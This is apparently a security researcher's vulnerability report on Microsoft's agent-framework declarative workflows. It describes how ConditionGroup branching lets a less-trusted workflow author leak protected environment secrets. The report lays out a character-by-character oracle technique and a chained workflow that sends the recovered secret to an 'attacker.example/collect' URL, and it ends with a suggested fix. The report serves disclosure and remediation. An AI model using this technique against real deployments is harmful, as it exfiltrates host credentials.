# F-021-MS — Declarative workflow protected-value boundary bypass via ConditionGroup oracle

Target: microsoft/agent-framework — Microsoft.Agents.AI.Workflows.Declarative (stable, in-scope OSS repo)
Tested package: NuGet Microsoft.Agents.AI.Workflows.Declarative 1.24.0 (the release that FIXED GHSA-9f26/q7g7)
Also present on main @2d9cc3f (ObjectModel/ConditionGroupExecutor.cs:62-66).
Class: CWE-200 / CWE-203 information disclosure — protected-value boundary bypass.
Sibling of GHSA-9f26-7mqc-9vc4 (CVSS 7.5 High, credited externally, fixed in 1.24.0).

## Root cause
The engine tags every value derived from a protected Env entry SensitivityLevel.Sensitive
(Kit/RootExecutor.cs InitializeEnvironmentAsync -> Extensions/IWorkflowContextExtensions.cs QueueEnvironmentUpdateAsync
sensitivity: Sensitive). Expression sensitivity = max over referenced variables
(PowerFx/WorkflowExpressionEngine.cs GetSensitivity). Every data SINK rejects Sensitive:
SendActivity:22, HttpRequest GetRequestValue:317 (method/URL/headers/body/query), InvokeMcpTool:517,
InvokeFunctionTool:569, InvokeAzureAgent, Question, AddConversationMessage, CopyConversationMessages.
Assignments propagate sensitivity (SetVariable:24, Foreach:60).

GAP: ObjectModel/ConditionGroupExecutor.cs:62-66 evaluates each branch condition and branches on
`.Value` with NO sensitivity check. A branch body assigns a LITERAL (sensitivity None) into a plain
variable, so a workflow laundered the secret into a non-sensitive variable and passed it to a guarded
sink. This defeats the boundary that #8832/#8837/#8839/#9071/GHSA-9f26 enforce everywhere else.

## Attacker model (identical to GHSA-9f26, which MS paid)
Host runs a declarative workflow definition authored by a less-trusted party, exposes protected
config/secret values to the workflow Env scope (DeclarativeWorkflowOptions.AllowedEnvironmentVariables,
from IConfiguration or process env via AllowProcessEnvironmentVariableFallback), and lets the workflow
reach a sink the attacker observes (SendActivity text returned to the caller, an HTTP request to an
attacker host, or an MCP tool call). The workflow author then exfiltrates the host's secrets.

## Three-pair evidence (captured-output.txt), real package, no network
- A direct  (`SendActivity {Env.API_SECRET}`)                 -> BLOCKED: "Cannot send sensitive activity text"
- B derived (`SetVariable =Left(Env.API_SECRET,2)` then send) -> BLOCKED: same boundary (derived stays Sensitive)
- C oracle  (ConditionGroup on `=StartsWith(Env.API_SECRET,"sk_live")`, branch writes literal, send)
                                                              -> EMITTED "OUT=prefix_is_sk_live" (BYPASS)
- D extraction: repeating the oracle with `=Mid(Env.API_SECRET,i,1)="<c>"` recovered the FULL secret
  "sk_live_SECRETBIT" character-by-character. match=True.

A/B are the sibling handlers that correctly deny; C/D are the bug; the else-branch literal is the control.

## EXPLOIT-GATE: F-021-MS
 1 refuted-xcheck    : PASS  no prior lead; GHSA-9f26 lists only MCP-executor locations, not ConditionGroup
 2 input-provenance  : PASS  workflow-definition author controls YAML; host exposes Env via documented option
 3 full-path PoC     : PASS  real NuGet 1.24.0, real DeclarativeWorkflowBuilder.Build + InProcessExecution,
                             real OnConversationStart entry, real SendActivity sink
 4 transform-ledger  : PASS  literal in branch body -> SensitivityLevel.None; SetVariable keeps it None;
                             sink sees None and emits; secret-dependent control flow selected which literal
 5 precedent-diff    : PASS  same engine, same boundary, same sink set as GHSA-9f26; only the gate site differs
 6 controls          : PASS  positive boundary held (A,B blocked); attack captured (C emits; D full recovery)
 7 adversarial-refute: PASS  only neutralizer would be "host never exposes secrets to Env" — which would also
                             void GHSA-9f26; no upstream fix touches ConditionGroupExecutor sensitivity on main
VERDICT: SUBMITTABLE

## Severity (estimate)
Improper information disclosure of host secrets to a less-trusted workflow author. MS rated the identical
boundary failure (GHSA-9f26) CVSS 7.5 High. Program band: Information Disclosure / Improper Access Control,
Important. Needs the host preconditions above (same as the paid advisory).

## Suggested fix
In ConditionGroupExecutor (and the generated ActionExecutor condition path), reject or taint-propagate when
the evaluated condition's Sensitivity == Sensitive, matching the sink guards — or propagate sensitivity into
any variable assigned inside a branch whose selection depended on a Sensitive condition.

## Repro
cd this dir; `~/.dotnet/dotnet run -c Release`. Fabricated secret, fully local, no Azure, no network.

## CHAIN + validity re-check (2026-10-08, captured-output.txt) — single-shot full-secret exfil
- validity: oracle output TRACKS the secret — API_SECRET="...AAA" -> "ends_other"; "...ZZZ" -> "ends_ZZZ".
  Proves the ConditionGroup condition genuinely reads Env.API_SECRET (not a constant/harness artifact).
- chain: one workflow reconstructs the FULL secret into a non-sensitive variable (nested Foreach over
  Sequence(20) x charset, ConditionGroup `=Mid(Env.API_SECRET,Pos,1)=Ch`, SetVariable Acc=Concatenate(Acc,Ch)),
  then a single HttpRequestAction with url `=Concatenate("https://attacker.example/collect?d=", Local.Acc)`.
  Attacker-controlled sink (CapturingHandler) received: https://attacker.example/collect?d=sk_live_SECRETBIT
  => entire protected secret exfiltrated to an attacker URL in ONE run, no response-channel observation.
  Same exfil channel class as GHSA-9f26 (external send), reached through the unpatched ConditionGroup gate.
- Chain impact does NOT raise the ceiling above C:H / Important (no I/A, no code exec); it removes the
  "only a one-bit oracle / low practicality" downgrade. CapturingHandler is MS's own custom-handler test
  pattern (see IntegrationTests/Workflows/HttpRequest.yaml), so the sink is realistic, not contrived.
